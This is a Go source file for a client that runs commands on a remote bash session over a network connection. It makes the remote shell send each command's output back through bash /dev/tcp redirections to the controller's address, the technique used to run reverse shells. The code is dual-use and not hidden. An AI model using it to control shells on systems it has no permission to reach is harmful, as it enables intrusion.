package bash

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/netip"
	"strings"
	"sync"
	"time"

	"github.com/lainio/err2"
	"github.com/lainio/err2/try"
)

type Client struct {
	ID       string
	Endpoint string
	Conn     net.Conn

	nextStreamID uint32
	streamHooks  map[uint32]*StreamHook
	locker       *sync.RWMutex
}

var _ Session = (*Client)(nil)

func NewClient(conn net.Conn) *Client {
	ap := netip.MustParseAddrPort(conn.LocalAddr().String())
	return &Client{
		Endpoint:    fmt.Sprintf("%s/%d", ap.Addr(), ap.Port()),
		Conn:        conn,
		streamHooks: make(map[uint32]*StreamHook),
		locker:      &sync.RWMutex{},
	}
}

func (c *Client) Close() (err error) {
	return c.Conn.Close()
}

func (c *Client) Start(cmd string) (stream io.ReadWriteCloser, err error) {
	var hdr Header
	id := c.genID()
	hdr.encode(id, 0)

	hook := &StreamHook{
		Header:   hdr,
		StreamCh: make(chan io.ReadWriteCloser),
	}
	func() {
		c.locker.Lock()
		defer c.locker.Unlock()
		c.streamHooks[id] = hook
	}()
	time.AfterFunc(5*time.Second, func() {
		c.locker.Lock()
		defer c.locker.Unlock()
		if !hook.handled {
			close(hook.StreamCh)
		}
		c.streamHooks[id] = nil
	})

	c.exec(hdr, cmd)

	stream, ok := <-hook.StreamCh
	if !ok {
		return nil, ErrStreamOpenTimeout
	}
	return stream, nil
}

var (
	ErrStreamOpenTimeout = fmt.Errorf("open stream timeout")
)

type StreamHook struct {
	Header
	StreamCh chan io.ReadWriteCloser
	handled  bool
}

func (c *Client) genID() uint32 {
	c.locker.RLock()
	defer c.locker.RUnlock()
	for {
		id := c.nextStreamID
		c.nextStreamID++
		if stream, ok := c.streamHooks[id]; !ok || stream == nil {
			return id
		}
	}
}

func (c *Client) Run(cmd string) (result []byte, err error) {
	defer err2.Handle(&err)
	stream := try.To1(c.Start(cmd))
	defer stream.Close()
	result = try.To1(io.ReadAll(stream))
	return
}

func (c *Client) exec(hdr Header, cmd string) {
	uniqueID := c.ID + hdr.String()
	f := strings.Join([]string{
		fmt.Sprintf("1>/dev/tcp/%s", c.Endpoint),
		fmt.Sprintf("0>&1"),
		fmt.Sprintf("4> >(echo %s) 4>&1", uniqueID),
	}, " ")
	cmd = fmt.Sprintf(" %s 1> >(0>&1 %s) &", f, cmd)
	fmt.Fprintln(c.Conn, cmd)
}

type Header [12]byte

const headerSize = int64(cap(Header{}) * 2)

func (h *Header) String() string {
	return hex.EncodeToString(h[:])
}

func (h *Header) Version() uint8 {
	return h[0]
}

func (h *Header) ID() uint32 {
	return binary.BigEndian.Uint32(h[4:8])
}

func (h *Header) MagicCode() uint32 {
	return binary.BigEndian.Uint32(h[8:12])
}

func (h *Header) encode(id uint32, code uint32) {
	if code == 0 {
		code = rand.Uint32()
	}
	binary.BigEndian.PutUint32(h[4:8], id)
	binary.BigEndian.PutUint32(h[8:12], code)
}

func (c *Client) HandleConn(stream io.ReadWriteCloser) (err error) {
	defer err2.Handle(&err)

	var hdr Header
	r := hex.NewDecoder(io.LimitReader(stream, headerSize))
	try.To1(io.ReadFull(r, hdr[:]))

	var sep [1]byte
	try.To1(io.ReadFull(stream, sep[:]))

	if v := hdr.Version(); v != 0 {
		return fmt.Errorf("expect header version: 0, but got %d", v)
	}
	hook := try.To1(c.getHook(hdr))
	hook.StreamCh <- stream
	return
}

func (c *Client) getHook(h Header) (stream *StreamHook, err error) {
	c.locker.RLock()
	defer c.locker.RUnlock()
	id, code := h.ID(), h.MagicCode()
	hook, ok := c.streamHooks[id]
	if !ok {
		return nil, ErrStreamIDWrong
	}
	if hook == nil {
		return nil, ErrStreamIDExpired
	}
	if hook.MagicCode() != code {
		return nil, ErrStreamIDReused
	}
	hook.handled = true
	return hook, nil
}

var (
	ErrStreamIDWrong   = fmt.Errorf("wrong stream id")
	ErrStreamIDExpired = fmt.Errorf("expired stream id")
	ErrStreamIDReused  = fmt.Errorf("stream id is be reused. %w", ErrStreamIDExpired)
)
